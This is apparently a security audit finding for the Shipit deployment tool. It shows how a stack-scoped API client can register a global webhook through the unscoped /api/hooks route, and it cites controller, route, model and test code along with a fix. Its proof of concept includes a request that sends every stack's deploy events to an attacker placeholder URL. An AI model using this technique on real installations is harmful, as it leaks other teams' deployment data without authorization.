### Title
API client scoped to one stack can register a global hook and receive every other stack's deploy/task events - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
An `ApiClient` scoped to a single stack (`stack_id` set) but granted `write:hook`/`read:hook` permissions can use the unscoped `/api/hooks` route to create, read, update or destroy a *global* `Hook` (`stack_id: nil`). Global hooks receive delivery of events for **every** stack in the Shipit install, not just the stack the client was authorised for. This breaks the binding "a stack a token authorises" (the single stack referenced by `ApiClient#stack_id`) versus "a stack it touches" (all stacks, via the global hook's event stream).

### Finding Description
`ApiClient` can be scoped to a single stack via `belongs_to :stack, optional: true` and `Shipit::Api::BaseController#stacks` deliberately restricts stack-scoped read/write operations to that one stack: [1](#0-0) 

However, `Shipit::Api::HooksController` computes the `Hook` scope purely from the presence of a `:stack_id` **route/URL** parameter, never from `current_api_client.stack_id`: [2](#0-1) 

`config/routes.rb` exposes both a stack-scoped hooks resource (`/api/stacks/*stack_id/hooks`) and a completely separate, unscoped top-level resource `resources :hooks` (`/api/hooks`): [3](#0-2) 

When the unscoped route is hit, `params[:stack_id]` is absent, so `stack_id` returns `nil`, and `hooks` becomes `Hook.where(stack_id: nil)` — i.e. the set of *global* hooks. `require_permission :write, :hook` / `:read, :hook` only checks that the permission string is present in `ApiClient#permissions`; it never checks `current_api_client.stack_id?`: [4](#0-3) 

`Hook.deliver` explicitly matches global hooks (`stack_id: nil`) against every stack's events: [5](#0-4) 

So an `ApiClient` created with `stack: shipit` (i.e., meant to only see/act on the `shipit` stack, as in the `here_come_the_walrus` fixture) but which also has `write:hook` can `POST /api/hooks` and create a hook with `stack_id: nil`. That hook will subsequently receive `deploy`, `rollback`, `task`, `merge_status`, `deployable_status`, `commit_status`, `lock`, `pull_request`, etc. events for every stack in the installation — including stacks the client was never authorised to read (`read:stack`) or act on. The existing test suite confirms the unscoped route is reachable and creates global hooks without any additional check tied to the client's stack scope: [6](#0-5) [7](#0-6) 

None of these tests authenticate with a stack-scoped client, so the missing binding check between `current_api_client.stack_id` and the created hook's `stack_id` is not exercised or enforced anywhere in the controller.

### Impact Explanation
This matches the rules' described binding-break category directly: "a stack a token authorises versus a stack it touches." A stack-scoped `ApiClient` (an unprivileged, narrowly-authorised credential intended for one stack/application) can be granted `write:hook`+`read:hook` by an application owner believing it is limited to that one stack, and instead register a listener that streams deploy/rollback/task lifecycle events — including deploy URLs, task/deploy status, commit SHAs, and stack identifiers — for all other stacks in the Shipit deployment. This is an unauthorized read of stack state/deploy output belonging to stacks outside the client's authorized scope, satisfying the High-impact bar ("unauthenticated read of stack state, task streams or deploy output" — here achieved via a token whose authorization boundary is a single stack, but which is not enforced on the hooks endpoint).

### Likelihood Explanation
Likelihood is moderate-to-high wherever `Shipit::ApiClient` scoping to a single stack is used as an isolation boundary (a documented, supported feature — `ApiClient#stack` and `BaseController#stacks`) and the same client is also granted a hook permission. No additional secrets, GitHub credentials, or elevated privileges are required beyond the stack-scoped API client token itself; the attacker only needs to call a different, already-mounted route (`/api/hooks` instead of `/api/stacks/:id/hooks`) with the same credentials.

### Recommendation
In `Shipit::Api::HooksController`, enforce the client's stack scope on all four actions: if `current_api_client.stack_id?`, force `stack_id` to `current_api_client.stack_id` (reject attempts to create/read/update/destroy global hooks or hooks belonging to other stacks) rather than deriving the scope solely from the `params[:stack_id]` URL segment.

### Proof of Concept
1. Create an `ApiClient` scoped to `stack: shipit` with permissions `['read:stack', 'write:hook', 'read:hook']` (mirrors the `here_come_the_walrus` fixture plus hook permissions).
2. Authenticate as this client and call:
   `POST /api/hooks` with `{ delivery_url: 'https://attacker.example.com/collect', events: ['deploy', 'rollback', 'task', 'merge_status'] }`
   — this succeeds (per `test/controllers/api/hooks_controller_test.rb:51-59`, the create action has no stack-scope guard) and creates a `Hook` with `stack_id: nil`.
3. Any deploy, rollback, task, or merge-status change on **any** stack in the installation (not just `shipit`) triggers `Hook.deliver(event, stack_id, payload)`, which via `for_stack(stack_id)` includes this global hook, delivering the event payload (commit SHA, deploy URL, task status, stack name) to `https://attacker.example.com/collect` — data belonging to stacks the client was never granted `read:stack` for.

### Citations

**File:** app/controllers/shipit/api/base_controller.rb (L74-80)
```ruby
      def stacks
        @stacks ||= current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all
      end

      def stack
        @stack ||= stacks.from_param!(params[:stack_id])
      end
```

**File:** app/controllers/shipit/api/hooks_controller.rb (L42-52)
```ruby
      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

      def stack_id
        stack.id if params[:stack_id].present?
      end
```

**File:** config/routes.rb (L27-47)
```ruby
    scope '/stacks/*stack_id', stack_id: stack_id_format, as: :stack do
      get '/ccmenu' => 'ccmenu#show', as: :ccmenu
      resource :lock, only: %i[create update destroy]
      resources :tasks, only: %i[index show] do
        resource :output, only: :show
        member do
          put :abort
        end
      end
      resources :deploys, only: %i[index create] do
        resources :release_statuses, only: %i[create]
      end
      resources :rollbacks, only: %i[create]
      resources :commits, only: %i[index]
      resources :merge_requests, only: %i[index show update destroy]
      post '/task/:task_name' => 'tasks#trigger', as: :trigger_task
      resources :hooks, only: %i[index create show update destroy]
    end

    resources :hooks, only: %i[index create show update destroy]
  end
```

**File:** app/models/shipit/api_client.rb (L38-45)
```ruby
    def check_permissions!(operation, scope)
      required_permission = "#{operation}:#{scope}"
      unless permissions.include?(required_permission)
        raise InsufficientPermission, "This operation requires the `#{required_permission}` permission"
      end

      true
    end
```

**File:** app/models/shipit/hook.rb (L93-119)
```ruby
    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```

**File:** test/controllers/api/hooks_controller_test.rb (L17-26)
```ruby
      test "#index without a stack_id returns the list of global hooks" do
        hook = Hook.global.first

        get :index
        assert_response :ok
        assert_json '0.id', hook.id
        assert_json '0.delivery_url', hook.delivery_url
        assert_json '0.content_type', hook.content_type
        assert_no_json '0.stack'
      end
```

**File:** test/controllers/api/hooks_controller_test.rb (L51-59)
```ruby
      test "#create adds a new hook" do
        assert_difference -> { Hook.count }, 1 do
          post :create, params: { delivery_url: 'https://example.com/hook', events: %w[deploy rollback] }
        end
        hook = Hook.last
        assert_json 'delivery_url', 'https://example.com/hook'
        assert_json 'url', "http://shipit.com/api/hooks/#{hook.id}"
        assert_json 'id', hook.id
      end
```
